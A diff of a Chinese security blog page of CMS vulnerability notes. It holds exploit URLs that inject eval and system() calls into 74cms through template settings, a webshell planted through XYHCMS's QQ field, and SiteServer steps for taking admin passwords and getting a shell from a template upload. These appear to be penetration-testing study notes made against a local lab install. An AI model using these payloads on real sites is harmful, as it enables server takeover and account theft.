@@ -8,7 +8,7 @@
   
   
   
-  <title>CMS漏洞 | JohnScott2046的博客</title>
+  <title>44CMS漏洞 | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,12 +254,12 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>CMS漏洞</span>
+    <span>44CMS漏洞</span>
   </h1>
   <div class="article-top-meta">
     <span>
       发布 : 
-      2021-10-05
+      2021-10-25
     </span>
     
       <span>
@@ -303,6 +303,7 @@
 <p><a target="_blank" rel="noopener" href="http://127.0.0.1/74-4.2.11cms/74cms_v4.2.111/upload/index.php?m=admin&amp;c=tpl_dir=&#39;,&#39;a&#39;,eval($_GET[1]),&#39;">http://127.0.0.1/74-4.2.11cms/74cms_v4.2.111/upload/index.php?m=admin&amp;c=tpl_dir=&#39;,&#39;a&#39;,eval($_GET[1]),&#39;</a></p>
 <p><a target="_blank" rel="noopener" href="http://127.0.0.1/74-4.2.11cms/74cms_v4.2.111/upload/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir=a%27.$%7Bphpinfo()%7D.%27">http://127.0.0.1/74-4.2.11cms/74cms_v4.2.111/upload/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir=a%27.${phpinfo()}.%27</a></p>
 <p><a target="_blank" rel="noopener" href="http://127.0.0.1/74-4.2.11cms/74cms_v4.2.111/upload/Application/Home/Conf/config.php?1=phpinfo()">http://127.0.0.1/74-4.2.11cms/74cms_v4.2.111/upload/Application/Home/Conf/config.php?1=phpinfo()</a>;<br><a target="_blank" rel="noopener" href="http://127.0.0.1/74-4.2.11cms/74cms_v4.2.111/upload/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir=a%27.$%7Bsystem(&#39;ipconfig&#39;)}.%27">http://127.0.0.1/74-4.2.11cms/74cms_v4.2.111/upload/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir=a%27.${system(&#39;ipconfig&#39;)}.%27</a></p>
+<p>74cms/index.php?m=Admin&amp;c=Tpl&amp;a=set&amp;tpl_dir=a%27.${phpinfo()}.%27</p>
 <p>上面的操作其实是先设置一个参数（这个是在模板设置那里实现的）然后在通过 config 去执行<br>漏洞法分析<br>先抓取模板设置的包</p>
 <p>发现 tpl_dir=default 传递了 default 这个参数 设置了之后模板变了刚才我们先执行的是先 phpinfo 然后去传递参数 说明设置和传递执行是可控制的<br>代码审计一下这个参数是怎么传递的</p>
 <p>也就说我们第一步传递了参数，然后通过这个 cofig.php 再传递下去设置成功。如果我们不传递参数，就<br>会执行这个 default 所以就是默认的模板设置成功</p>
@@ -310,6 +311,10 @@
 <h4 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h4><p>系统设置-在线客服设置-qq </p>
 <p>输入框 直接写入一句话木马 </p>
 <p>连接地址<br><a target="_blank" rel="noopener" href="http://127.0.0.1/xyhcms_v3.2/uploads_code/App/Runtime/Data/config/site.php">http://127.0.0.1/xyhcms_v3.2/uploads_code/App/Runtime/Data/config/site.php</a></p>
+<h3 id="SiteServer禁用JS获取后台账号密码"><a href="#SiteServer禁用JS获取后台账号密码" class="headerlink" title="SiteServer禁用JS获取后台账号密码"></a>SiteServer禁用JS获取后台账号密码</h3><p>这个CMS（siteserver），可以通过禁用JS来找回后台管理员密码</p>
+<p>具体操作在’忘记密码’，输入’admin’，然后禁用JS，一直下一步最后就能获取到’admin’的密码了</p>
+<p>用到的插件是 Quick Javascript Switcher</p>
+<h4 id="SiteServer-后台模板-Getshell"><a href="#SiteServer-后台模板-Getshell" class="headerlink" title="SiteServer 后台模板 Getshell"></a>SiteServer 后台模板 Getshell</h4><p>在’系统管理’，’站点模版管理’，’导入站点模版’，将做过绕waf的aspx一句话压缩为rar，然后上传</p>
 
     </div>
   </div>
@@ -413,13 +418,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/43%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" target="_self">未授权访问漏洞</a>
+        <a href="/2021/43%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" target="_self">43未授权访问漏洞</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/45%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_self">反序列化漏洞</a>
+        <a href="/2021/45%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_self">45反序列化漏洞</a>
         <i class="iconfont icon-next"></i>
       </div>
     
